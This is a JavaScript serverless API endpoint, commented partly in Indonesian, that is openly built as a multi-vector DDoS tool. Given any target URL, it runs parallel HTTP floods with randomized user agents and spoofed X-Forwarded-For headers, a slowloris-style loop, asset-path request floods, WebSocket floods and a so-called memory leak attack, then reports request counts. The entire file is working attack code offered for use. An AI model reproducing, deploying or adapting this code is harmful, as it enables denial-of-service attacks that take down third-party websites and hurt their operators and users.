// api/ddos.js — EXTREME MULTI-VECTOR DDOS
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    
    if (req.method === 'OPTIONS') return res.status(200).end();

    try {
        const { target, duration = 60, threads = 30 } = req.query;
        
        if (!target) {
            return res.status(400).json({ error: 'Target URL required' });
        }

        // PARALLEL MULTI-ATTACK
        const results = await Promise.all([
            httpFlood(target, parseInt(duration), parseInt(threads)),
            slowLoris(target, parseInt(duration)),
            resourceBomb(target, parseInt(duration)),
            webSocketFlood(target, parseInt(duration)),
            memoryLeakAttack(target, parseInt(duration))
        ]);

        const total = results.reduce((acc, r) => acc + r.total, 0);
        const success = results.reduce((acc, r) => acc + r.success, 0);
        
        return res.status(200).json({
            status: '💀 EXTREME ATTACK EXECUTED',
            target,
            duration,
            totalRequests: total,
            success,
            vectors: {
                httpFlood: results[0],
                slowLoris: results[1],
                resourceBomb: results[2],
                webSocket: results[3],
                memoryLeak: results[4]
            },
            note: 'Multiple attack vectors deployed simultaneously'
        });
        
    } catch (error) {
        return res.status(500).json({ 
            error: 'Attack engine error', 
            details: error.message 
        });
    }
}

// 1. HTTP FLOOD — PALING CEPAT
async function httpFlood(target, duration, threads) {
    const results = { total: 0, success: 0 };
    const endTime = Date.now() + (duration * 1000);
    
    const flood = async () => {
        const url = target.includes('?') 
            ? `${target}&_=${Math.random()}`
            : `${target}?_=${Math.random()}`;
        
        try {
            const res = await fetch(url, {
                headers: {
                    'User-Agent': randomUA(),
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'X-Forwarded-For': generateFakeIP()
                },
                signal: AbortSignal.timeout(3000)
            });
            return { success: res.ok };
        } catch {
            return { success: false };
        }
    };

    // RUN PARALLEL
    while (Date.now() < endTime) {
        const promises = [];
        for (let i = 0; i < threads * 2; i++) {
            promises.push(flood());
        }
        const batch = await Promise.allSettled(promises);
        batch.forEach(r => {
            results.total++;
            if (r.status === 'fulfilled' && r.value.success) results.success++;
        });
        await sleep(10);
    }
    return results;
}

// 2. SLOWLORIS — MATIKAN DENGAN KONEKSI LAMBAT
async function slowLoris(target, duration) {
    const results = { total: 0, success: 0 };
    const endTime = Date.now() + (duration * 1000);
    
    while (Date.now() < endTime) {
        for (let i = 0; i < 20; i++) {
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 30000);
                
                const res = await fetch(target, {
                    headers: {
                        'User-Agent': randomUA(),
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Keep-Alive': 'timeout=999, max=999'
                    },
                    signal: controller.signal
                });
                
                clearTimeout(timeout);
                results.total++;
                results.success++;
            } catch {
                results.total++;
            }
        }
        await sleep(50);
    }
    return results;
}

// 3. RESOURCE BOMB — BANJIRI REQUEST KE ASSET
async function resourceBomb(target, duration) {
    const results = { total: 0, success: 0 };
    const endTime = Date.now() + (duration * 1000);
    const resources = ['/images/', '/css/', '/js/', '/assets/', '/uploads/', '/media/'];
    
    while (Date.now() < endTime) {
        for (const path of resources) {
            const url = `${target}${path}?${Math.random()}`;
            try {
                const res = await fetch(url, {
                    headers: { 'User-Agent': randomUA() },
                    signal: AbortSignal.timeout(2000)
                });
                results.total++;
                if (res.ok) results.success++;
            } catch {
                results.total++;
            }
        }
        await sleep(20);
    }
    return results;
}

// 4. WEBSOCKET FLOOD
async function webSocketFlood(target, duration) {
    const results = { total: 0, success: 0 };
    const endTime = Date.now() + (duration * 1000);
    const wsUrl = target.replace('http', 'ws') + '/ws';
    
    while (Date.now() < endTime) {
        for (let i = 0; i < 10; i++) {
            try {
                const ws = new WebSocket(wsUrl);
                ws.onopen = () => {
                    results.total++;
                    results.success++;
                    ws.send(JSON.stringify({ data: 'x'.repeat(5000) }));
                    setTimeout(() => ws.close(), 100);
                };
                ws.onerror = () => { results.total++; };
            } catch {
                results.total++;
            }
        }
        await sleep(100);
    }
    return results;
}

// 5. MEMORY LEAK — BIKIN BROWSER CRASH
async function memoryLeakAttack(target, duration) {
    const results = { total: 0, success: 0 };
    const endTime = Date.now() + (duration * 1000);
    let counter = 0;
    
    while (Date.now() < endTime && counter < 5000) {
        try {
            const res = await fetch(`${target}?leak=${counter++}`, {
                headers: { 'User-Agent': randomUA() }
            });
            results.total++;
            if (res.ok) results.success++;
            
            // LOAD LARGE IMAGES
            for (let i = 0; i < 5; i++) {
                fetch(`${target}/img/${Math.random()}.jpg`, {
                    headers: { 'User-Agent': randomUA() }
                }).catch(() => {});
            }
        } catch {
            results.total++;
        }
        await sleep(5);
    }
    return results;
}

// UTILITY FUNCTIONS
function randomUA() {
    const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}

function generateFakeIP() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
